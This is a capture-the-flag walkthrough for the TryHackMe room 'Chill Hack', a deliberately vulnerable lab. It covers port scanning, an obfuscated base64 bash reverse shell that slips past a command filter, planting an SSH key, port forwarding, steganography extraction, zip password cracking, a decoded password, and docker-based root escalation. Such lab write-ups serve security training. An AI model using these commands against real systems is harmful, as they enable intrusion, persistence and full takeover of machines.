---
description: https://tryhackme.com/room/chillhack
---

# Chill Hack

## Nmap

```
sudo nmap 10.10.77.207 -p- -sS -sV

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 
(Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Port 80 takes us to the following page:

![](<../../../.gitbook/assets/image (945).png>)

Running dirsearch against the target machine reveals a directory called secret.

![](<../../../.gitbook/assets/image (946) (1).png>)

The following page for /secret/ contains a command box.

![](<../../../.gitbook/assets/image (947).png>)

Running the id command shows we are running as www-data.

![](<../../../.gitbook/assets/image (948).png>)

Attempting to run binaries and commands such as cat are filtered presenting with the following page.

![](<../../../.gitbook/assets/image (949).png>)

The following page from [https://book.hacktricks.xyz/linux-unix/useful-linux-commands/bypass-bash-restrictions](https://book.hacktricks.xyz/linux-unix/useful-linux-commands/bypass-bash-restrictions) shows that we have multiple ways to attempt to bypass the filter. The first section regarding Reverse shell shows a reliable method for gaining a shell.

```
echo "echo $(echo 'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'
```

Once the command has been run on the attacking machine take the output and run it on the command box on the target machine.

![](<../../../.gitbook/assets/image (950).png>)

The output below was run on the target machine and `netcat` on my attacking machine caught a shell.

```
echo${IFS}WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhOQzR6TGpFd09DODRNQ0F3UGlZeENnPT0K|ba''se''6''4${IFS}-''d|ba''se''64${IFS}-''d|b''a''s''h
```

![](<../../../.gitbook/assets/image (951).png>)

Running linpeas.sh on the target machine reveals the following interesting information:\\

![](<../../../.gitbook/assets/image (952).png>)

Running `sudo -u aparr /home/apaar/.helpline.sh` produces an interactive shell script. Which can be escaped by running `bash`.

![](<../../../.gitbook/assets/image (953).png>)

Linpeas shows a service is running locally on port 9001.

![](<../../../.gitbook/assets/image (954).png>)

We can drop a SSH key onto the attacking server to get SSH service to then forward the port to our attacking machine.

**Attacking machine**

```
ssh-keygen -t rsa
```

Hit enter until the command completes. Copy the contents of the id\_rsa.pub file in the attacking machines home directory and echo this into authorized\_keys file for the user apaar.

**Target machine**

```
echo '<Contents of attacking machine id_rsa.pub>' > /home/apaar/.ssh/authorized_keys
```

![](<../../../.gitbook/assets/image (955).png>)

We can then connect to SSH as the user apaar without specifcying the password. Using the following syntax we can forward the target machine local port of 9001 to our attacking machine with SSH.

```
ssh -L 9001:127.0.0.1:9001 apaar@10.10.77.207  
```

We can then access http://127.0.0.1:9001 in a web browser.

![http://127.0.0.1:9001/](<../../../.gitbook/assets/image (956).png>)

Performing directory enumeration on this reveals the /images/ directory.

![](<../../../.gitbook/assets/image (957).png>)

![http://127.0.0.1:9001/images/](<../../../.gitbook/assets/image (958).png>)

Saving the image file hacker-with-laptop\_23-2147985341.jpg and running `steghide` reveals the following.

```
steghide --extract -sf ~/Desktop/hacker-with-laptop_23-2147985341.jpg 
```

![](<../../../.gitbook/assets/image (959).png>)

The archive backup.zip is password protected. Using zip2john we can create a hash and crack with john.

```
/usr/sbin/zip2john /home/kali/backup.zip > /home/kali/Desktop/hash
```

![](<../../../.gitbook/assets/image (960) (1).png>)

Extracting the contents reveals the file source\_code.php.

![](<../../../.gitbook/assets/image (962).png>)

Running the base64 value through -d reveals the following:

```
echo 'IWQwbnRLbjB3bVlwQHNzdzByZA==' | base64 -d
!d0ntKn0wmYp@ssw0rd     
```

We also have the user anurodh. The credentials can then be used to SSH into anurodh.

![](<../../../.gitbook/assets/image (963).png>)

Viewing the groups anurodh is a member of we do see docker. Running the following command taken from GTFOBins will give us root access. [https://gtfobins.github.io/gtfobins/docker/](https://gtfobins.github.io/gtfobins/docker/)

```
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

![](<../../../.gitbook/assets/image (964).png>)
